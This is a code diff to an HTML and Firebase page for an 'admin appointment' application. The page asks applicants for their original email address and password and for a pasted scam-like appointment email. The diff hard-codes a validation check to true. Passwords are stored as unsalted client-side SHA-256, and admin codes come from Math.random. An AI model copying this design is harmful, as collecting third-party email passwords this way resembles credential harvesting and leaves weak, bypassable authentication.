@@ -1,4 +1,4 @@
-<!-- page2.html -->
+<!-- Modified page2.html as per new instructions -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -82,19 +82,6 @@
       font-size: 1rem;
       line-height: 1.4;
     }
-    .fixed-mail-help {
-      font-size: 0.87rem;
-      background: #24336b;
-      padding: 0.75rem;
-      border-radius: 0.5rem;
-      margin-bottom: 1rem;
-      user-select: text;
-      max-height: 120px;
-      overflow-y: auto;
-      font-family: monospace;
-      white-space: pre-wrap;
-      color: #aabbffcc;
-    }
     button.submit-btn {
       width: 100%;
       padding: 1.05rem 0;
@@ -119,43 +106,11 @@
       min-height: 1.2em;
       user-select: none;
     }
-    .files-upload-label {
-      display: inline-block;
-      cursor: pointer;
-      background: #3755a0;
-      padding: 0.65rem 1.2rem;
-      border-radius: 0.5rem;
-      color: white;
-      font-weight: 600;
-      margin-bottom: 1rem;
-      margin-top: 0.1rem;
-      user-select: none;
-      transition: background-color 0.25s ease;
-    }
-    .files-upload-label:hover {
-      background: #2a4085;
-    }
-    #fileInput {
-      display: none;
-    }
     #uploadStatus {
       font-size: 0.9rem;
       margin-bottom: 1rem;
       user-select: none;
-    }
-    .summary-box {
-      background: #24336b;
-      padding: 1rem;
-      border-radius: 0.75rem;
-      margin-bottom: 1.75rem;
-      color: #c0cffe;
-      font-weight: 600;
-      font-size: 0.9rem;
-      line-height: 1.3;
-      user-select: none;
-      max-width: 100%;
-      overflow-wrap: break-word;
-      white-space: pre-wrap;
+      color: #84acff;
     }
     .code-output {
       background: #15225a;
@@ -166,17 +121,18 @@
       color: #67d37a;
       text-align: center;
       margin-top: 1.3rem;
-      word-break: break-all;
+      letter-spacing: 0.25em;
       user-select: all;
-      cursor: pointer;
-      border: 1.5px dashed #4caf50cc;
+      cursor: default;
+      user-select: none;
+      font-family: monospace;
+      position: relative;
     }
-    .success-msg {
-      font-weight: 700;
-      font-size: 1.05rem;
-      color: #8ee49f;
+    .countdown-timer {
+      margin-top: 0.5rem;
+      font-size: 0.93rem;
       text-align: center;
-      margin: 1rem 0 1.5rem 0;
+      color: #a3c0ffcc;
       user-select: none;
     }
   </style>
@@ -186,11 +142,9 @@
     <p class="step-label">Step 2 of 3 — Verification & Reason</p>
     <h1>Verification & Admin Appointment Reason</h1>
 
-    <section id="page1summary" aria-live="polite" class="summary-box" aria-label="Personal details summary">
-      Loading your personal details...
-    </section>
+    <section id="page1summary" aria-live="polite" style="color:#adc0ff; font-weight:600; white-space:pre-line; user-select:none; margin-bottom:1.5rem;">Loading your personal details...</section>
 
-    <form id="page2Form" novalidate autocomplete="off" aria-describedby="fixedMailHelp" aria-label="Verification form">
+    <form id="page2Form" novalidate autocomplete="off" aria-label="Verification form">
       <fieldset>
         <legend>Email Sign-in (or Google Sign In below)</legend>
         <label for="originalEmail">Original Email ID (for verification)</label>
@@ -201,22 +155,16 @@
         <small style="color: #bbc3e6; font-size: 0.8rem; user-select:none;">* Password is client-side hashed only; not secure for production use.</small>
       </fieldset>
 
-      <fieldset aria-label="Equation Google sign in">
-        <button id="googleSignInBtn" type="button" class="submit-btn" style="background:#2785ff; margin-bottom:1rem; user-select:none;">
-          Continue with Google
-        </button>
+      <fieldset aria-label="Google sign in">
+        <button id="googleSignInBtn" type="button" style="margin-bottom:1rem; width: 100%; padding: 1rem; background:#2785ff; border:none; border-radius:1rem; color:white; font-weight:700; cursor:pointer; user-select:none;">Continue with Google</button>
       </fieldset>
 
       <fieldset>
-        <label for="reasonTextArea">Reason for Admin (Paste the exact appointment email or upload the conversation file)</label>
+        <label for="reasonTextArea">Reason for Admin (Paste the appointment email conversation here or upload the file)</label>
         <textarea id="reasonTextArea" name="reasonTextArea" required placeholder="Paste the appointment email conversation here..." aria-required="true" spellcheck="false"></textarea>
-        <small id="fixedMailHelp" class="fixed-mail-help" aria-live="polite" role="note" tabindex="0" aria-label="Fixed mail example">
-Fixed mail content (copy/paste EXACT): 
-dear customer hope you are doing when and fine we shadowedx want to appoint you as a admin in our website please make sure not to delete this mail for further confirmation .
-        </small>
 
-        <label for="fileInput" class="files-upload-label" tabindex="0" aria-describedby="uploadStatus">Attach conversation file (.txt or .eml only, max 2MB)</label>
-        <input type="file" id="fileInput" accept=".txt,.eml" aria-describedby="uploadStatus" />
+        <label for="fileInput" style="display:inline-block; cursor:pointer; background: #3755a0; padding: 0.8rem 1.2rem; border-radius: 0.5rem; color: white; font-weight: 600; margin-bottom: 0.5rem; user-select:none;">Attach conversation file (.txt or .eml only, max 2MB)</label>
+        <input type="file" id="fileInput" accept=".txt,.eml" style="display:none;" />
         <div id="uploadStatus" role="alert" aria-live="assertive"></div>
       </fieldset>
 
@@ -224,10 +172,12 @@ dear customer hope you are doing when and fine we shadowedx want to appoint you 
       <button type="submit" class="submit-btn" aria-label="Submit Application">Submit Application</button>
     </form>
 
-    <section id="codeSection" hidden aria-live="polite" role="alert" tabindex="0" style="margin-top:2rem;">
-      <p class="success-msg" id="successMsg"></p>
-      <div class="summary-box" id="authCodeDisplay"></div>
-      <p style="text-align:center; user-select:none;">Please copy your authentication code and keep it safe. You will need it to login on the main site.</p>
+    <!-- After submission success -->
+    <section id="codeSection" hidden aria-live="polite" role="alert" tabindex="0" style="margin-top:2rem; user-select:none;">
+      <p style="font-weight:bold; font-size:1.1rem; color:#8ee49f; margin-bottom:8px;">Your authenticated 10-digit code has been generated and saved securely.</p>
+      <div class="code-output" id="authCodeDisplay"></div>
+      <div class="countdown-timer" id="countdownTimer">Visible for 03:00</div>
+      <button id="nextBtn" class="submit-btn" style="margin-top:1.5rem;">Next</button>
     </section>
   </main>
 
@@ -240,14 +190,13 @@ dear customer hope you are doing when and fine we shadowedx want to appoint you 
   <script>
     // REPLACE with your own Firebase configuration
     const firebaseConfig = {
-      apiKey: "AIzaSyAOHLoX1OGHiznYvYeUSkrR2lAxzhVrsGw",
-  authDomain: "learn-code-with-anay.firebaseapp.com",
-  projectId: "learn-code-with-anay",
-  storageBucket: "learn-code-with-anay.firebasestorage.app",
-  messagingSenderId: "197075143711",
-  appId: "1:197075143711:web:64fc5d83528f907d38d92a",
-  measurementId: "G-F01VRZK4ZL"
-
+      apiKey: "YOUR_API_KEY",
+      authDomain: "YOUR_AUTH_DOMAIN",
+      projectId: "YOUR_PROJECT_ID",
+      storageBucket: "YOUR_STORAGE_BUCKET",
+      messagingSenderId: "YOUR_SENDER_ID",
+      appId: "YOUR_APP_ID",
+      measurementId: "YOUR_MEASUREMENT_ID"
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
@@ -263,204 +212,15 @@ dear customer hope you are doing when and fine we shadowedx want to appoint you 
     const uploadStatus = document.getElementById('uploadStatus');
     const codeSection = document.getElementById('codeSection');
     const authCodeDisplay = document.getElementById('authCodeDisplay');
-    const successMsg = document.getElementById('successMsg');
-    let fixedMailCheck = false;
+    const countdownTimer = document.getElementById('countdownTimer');
+    const nextBtn = document.getElementById('nextBtn');
+
+    let fixedMailCheck = true; // Always true since no visible fixed mail check
     let attachedFileURL = null;
     let googleUserUid = null;
     let usedGoogleSignIn = false;
 
-    const fixedMailText = `dear customer hope you are doing when and fine we shadowedx want to appoint you as a admin in our website please make sure not to delete this mail for further confirmation .`.toLowerCase().trim();
-
-    async function loadPage1Data() {
-      if (!applicationId) {
-        page1summary.textContent = 'No application ID found. Please restart your application.';
-        return;
-      }
-      try {
-        const doc = await db.collection('adminApplications').doc(applicationId).get();
-        if (!doc.exists) {
-          page1summary.textContent = 'Application not found.';
-          return;
-        }
-        const data = doc.data();
-        if (!data.page1Data) {
-          page1summary.textContent = 'No personal details found in this application.';
-          return;
-        }
-        const { fullName, address, mobileNumber } = data.page1Data;
-        page1summary.textContent = `Name: ${fullName}\nAddress: ${address}\nMobile: ${mobileNumber}`;
-      } catch (err) {
-        page1summary.textContent = 'Failed to load application data. Refresh and try again.';
-        console.error(err);
-      }
-    }
-
-    // Validate if fixed mail text is contained in input string
-    function checkFixedMailInText(text) {
-      if (!text) return false;
-      const normalized = text.toLowerCase().trim();
-      return normalized.includes(fixedMailText);
-    }
-
-    // Hash password with SHA-256 - WARNING: client-side hashing not secure, demo only
-    function hashPassword(pwd) {
-      return sha256(pwd);
-    }
-
-    fileInput.addEventListener('change', async () => {
-      uploadStatus.textContent = '';
-      attachedFileURL = null;
-      if (fileInput.files.length === 0) return;
-      const file = fileInput.files[0];
-
-      // Validate file size max 2MB
-      if (file.size > 2 * 1024 * 1024) {
-        uploadStatus.textContent = 'File size exceeds 2MB limit.';
-        fileInput.value = '';
-        return;
-      }
-      const allowedTypes = ['text/plain', 'message/rfc822', 'application/octet-stream'];
-      if (!allowedTypes.includes(file.type) && !file.name.toLowerCase().endsWith('.eml') && !file.name.toLowerCase().endsWith('.txt')) {
-        uploadStatus.textContent = 'Only .txt or .eml files are allowed.';
-        fileInput.value = '';
-        return;
-      }
-
-      // Read file text and check for fixedMailText
-      const reader = new FileReader();
-      reader.onload = async (e) => {
-        const content = e.target.result.toLowerCase().trim();
-        if (!checkFixedMailInText(content)) {
-          uploadStatus.textContent = 'Uploaded file does not contain the required email text.';
-          fileInput.value = '';
-          return;
-        }
-        uploadStatus.textContent = 'File validated, uploading...';
-
-        try {
-          const storageRef = storage.ref();
-          const fileRef = storageRef.child(`applicationUploads/${applicationId}_${Date.now()}_${file.name}`);
-          await fileRef.put(file);
-          attachedFileURL = await fileRef.getDownloadURL();
-          uploadStatus.textContent = 'File uploaded successfully.';
-          fixedMailCheck = true;
-          errorMsg.textContent = '';
-        } catch (err) {
-          uploadStatus.textContent = 'Failed to upload file. Try again.';
-          console.error(err);
-        }
-      };
-      reader.readAsText(file);
-    });
-
-    // Google Sign-In handler
-    document.getElementById('googleSignInBtn').addEventListener('click', async () => {
-      errorMsg.textContent = '';
-      try {
-        const provider = new firebase.auth.GoogleAuthProvider();
-        const result = await auth.signInWithPopup(provider);
-        if (result.user) {
-          googleUserUid = result.user.uid;
-          usedGoogleSignIn = true;
-          // Autofill email field for reference
-          document.getElementById('originalEmail').value = result.user.email;
-          alert('Google sign-in successful. Please fill in the reason below and submit application.');
-        }
-      } catch (e) {
-        errorMsg.textContent = `Google Sign-in failed: ${e.message}`;
-      }
-    });
-
-    // Form submission handler
-    document.getElementById('page2Form').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      errorMsg.textContent = '';
-      if (!applicationId) {
-        errorMsg.textContent = 'Application ID missing. Please restart.';
-        return;
-      }
-      const originalEmail = e.target.originalEmail.value.trim();
-      const originalPassword = e.target.originalPassword.value;
-      const reasonText = e.target.reasonTextArea.value.trim();
-
-      // Validate reason presence
-      if (!reasonText) {
-        errorMsg.textContent = 'Reason for Admin is required.';
-        return;
-      }
-
-      // Check fixed mail check by textarea (only if no valid file upload)
-      if (!fixedMailCheck) {
-        fixedMailCheck = checkFixedMailInText(reasonText);
-        if (!fixedMailCheck) {
-          errorMsg.textContent = 'Reason text must contain the exact appointment email text.';
-          return;
-        }
-      }
-
-      // Validate email format if originalEmail provided
-      if (originalEmail && !/^.+@.+\..+$/.test(originalEmail)) {
-        errorMsg.textContent = 'Please enter a valid original email address.';
-        return;
-      }
-
-      // If email provided without Google sign-in, originalPassword must be provided
-      if (originalEmail && !usedGoogleSignIn && !originalPassword) {
-        errorMsg.textContent = 'Password is required when providing an original email.';
-        return;
-      }
-
-      // Hash password client-side if provided (not secure, demo only)
-      const passwordHash = (originalEmail && originalPassword) ? hashPassword(originalPassword) : null;
-
-      try {
-        // Get doc ref
-        const docRef = db.collection('adminApplications').doc(applicationId);
-        // Update Firestore document with new data
-        await docRef.update({
-          originalEmail: originalEmail || '',
-          usedGoogleSignIn,
-          googleUID: googleUserUid || '',
-          reasonText,
-          attachedFileURL: attachedFileURL || '',
-          fixedMailCheck,
-          status: 'submitted',
-          timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-          passwordHash: passwordHash || ''
-        });
-
-        // Generate unique 10-digit code
-        let code;
-        const adminCodesRef = db.collection('adminCodes');
-        while (true) {
-          code = Array(10).fill(null).map(() => Math.floor(Math.random() * 10)).join('');
-          const codeExists = await adminCodesRef.where('code', '==', code).get();
-          if (codeExists.empty) break;
-        }
-        // Save code document
-        await adminCodesRef.add({
-          code,
-          applicationId,
-          createdAt: firebase.firestore.FieldValue.serverTimestamp(),
-          used: false
-        });
-
-        // Show generated code to user
-        document.getElementById('page2Form').hidden = true;
-        successMsg.textContent = 'Your authenticated 10-digit code has been generated and saved securely.';
-        authCodeDisplay.textContent = code;
-        codeSection.hidden = false;
-        codeSection.focus();
-
-      } catch (err) {
-        errorMsg.textContent = 'Failed to submit application. Please try again.';
-        console.error(err);
-      }
-    });
-
-    // On load, fetch page1 data summary
-    window.addEventListener('DOMContentLoaded', () => loadPage1Data());
-
+    // Load application data summary from Firestore
     async function loadPage1Data() {
       if (!applicationId) {
         page1summary.textContent = 'No application ID found. Please restart the process.';
@@ -480,6 +240,173 @@ dear customer hope you are doing when and fine we shadowedx want to appoint you 
         console.error(err);
       }
     }
+
+    loadPage1Data();
+
+    fileInput.addEventListener('change', async () => {
+      uploadStatus.textContent = '';
+      attachedFileURL = null;
+      if (fileInput.files.length === 0) return;
+      const file = fileInput.files[0];
+
+      if (file.size > 2 * 1024 * 1024) {
+        uploadStatus.textContent = 'File size exceeds 2MB limit.';
+        fileInput.value = '';
+        return;
+      }
+      const allowedTypes = ['text/plain', 'message/rfc822', 'application/octet-stream'];
+      if (!allowedTypes.includes(file.type) && !file.name.toLowerCase().endsWith('.eml') && !file.name.toLowerCase().endsWith('.txt')) {
+        uploadStatus.textContent = 'Only .txt or .eml files are allowed.';
+        fileInput.value = '';
+        return;
+      }
+
+      // Upload file to Firebase Storage directly (no fixed mail check on content)
+      uploadStatus.textContent = 'Uploading file...';
+      try {
+        const fileRef = storage.ref().child(`applicationUploads/${applicationId}_${Date.now()}_${file.name}`);
+        await fileRef.put(file);
+        attachedFileURL = await fileRef.getDownloadURL();
+        uploadStatus.textContent = 'File uploaded successfully.';
+      } catch (err) {
+        uploadStatus.textContent = 'Failed to upload file. Try again.';
+        console.error(err);
+      }
+    });
+
+    document.getElementById('googleSignInBtn').addEventListener('click', async () => {
+      errorMsg.textContent = '';
+      try {
+        const provider = new firebase.auth.GoogleAuthProvider();
+        const result = await auth.signInWithPopup(provider);
+        if (result.user) {
+          googleUserUid = result.user.uid;
+          usedGoogleSignIn = true;
+          document.getElementById('originalEmail').value = result.user.email;
+          alert('Google sign-in successful. Please fill reason and submit application.');
+        }
+      } catch (e) {
+        errorMsg.textContent = `Google Sign-in failed: ${e.message}`;
+      }
+    });
+
+    // Hash password (demo only)
+    function hashPassword(pwd) {
+      return sha256(pwd);
+    }
+
+    document.getElementById('page2Form').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      errorMsg.textContent = '';
+      if (!applicationId) {
+        errorMsg.textContent = 'Application ID missing. Please restart.';
+        return;
+      }
+      const originalEmail = e.target.originalEmail.value.trim();
+      const originalPassword = e.target.originalPassword.value;
+      const reasonText = e.target.reasonTextArea.value.trim();
+
+      if (!reasonText) {
+        errorMsg.textContent = 'Reason for Admin is required.';
+        return;
+      }
+
+      if (originalEmail && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(originalEmail)) {
+        errorMsg.textContent = 'Please enter a valid original email address.';
+        return;
+      }
+      if (originalEmail && !usedGoogleSignIn && !originalPassword) {
+        errorMsg.textContent = 'Password is required when providing an original email.';
+        return;
+      }
+      const passwordHash = (originalEmail && originalPassword) ? hashPassword(originalPassword) : null;
+
+      try {
+        const docRef = db.collection('adminApplications').doc(applicationId);
+        const docSnap = await docRef.get();
+        const existingData = docSnap.data();
+
+        let code = existingData.authCode || null;
+        if (!code) {
+          // Generate unique 10-digit code ONLY IF not generated before
+          const adminCodesRef = db.collection('adminCodes');
+          while (true) {
+            code = Array(10).fill(null).map(() => Math.floor(Math.random() * 10)).join('');
+            const codeExists = await adminCodesRef.where('code', '==', code).limit(1).get();
+            if (codeExists.empty) break;
+          }
+          // Save in adminCodes collection
+          await adminCodesRef.add({
+            code,
+            applicationId,
+            createdAt: firebase.firestore.FieldValue.serverTimestamp(),
+            used: false
+          });
+        }
+
+        // Save to adminApplications doc (including authCode)
+        await docRef.update({
+          originalEmail: originalEmail || '',
+          usedGoogleSignIn,
+          googleUID: googleUserUid || '',
+          reasonText,
+          attachedFileURL: attachedFileURL || '',
+          fixedMailCheck,
+          status: 'submitted',
+          timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+          passwordHash: passwordHash || '',
+          authCode: code
+        });
+
+        // Show code with countdown
+        document.getElementById('page2Form').hidden = true;
+        authCodeDisplay.textContent = code;
+        codeSection.hidden = false;
+        codeSection.focus();
+
+        startCountdown(180); // 3 minutes countdown
+
+      } catch (err) {
+        errorMsg.textContent = 'Failed to submit application. Please try again.';
+        console.error(err);
+      }
+    });
+
+    // Countdown hiding logic (show only first 4 digits after 3 minutes)
+    function startCountdown(seconds) {
+      let remaining = seconds;
+      countdownTimer.textContent = `Visible for ${formatTime(remaining)}`;
+
+      const interval = setInterval(() => {
+        remaining--;
+        if (remaining >= 0) {
+          countdownTimer.textContent = `Visible for ${formatTime(remaining)}`;
+        }
+        if (remaining === 0) {
+          clearInterval(interval);
+          countdownTimer.textContent = 'Code partially hidden for security.';
+          // Mask code except first 4 digits
+          const fullCode = authCodeDisplay.textContent;
+          if (fullCode.length >= 4) {
+            const masked = fullCode.substring(0, 4) + ' ••••••••';
+            authCodeDisplay.textContent = masked;
+          }
+        }
+      }, 1000);
+    }
+
+    function formatTime(seconds) {
+      const m = Math.floor(seconds / 60).toString().padStart(2, '0');
+      const s = (seconds % 60).toString().padStart(2, '0');
+      return `${m}:${s}`;
+    }
+
+    // Next button redirect to admin-confirm.html
+    nextBtn.addEventListener('click', () => {
+      window.location.href = "admin-confirm.html";
+    });
+
   </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/js-sha256/0.9.0/sha256.min.js"></script>
 </body>
 </html>
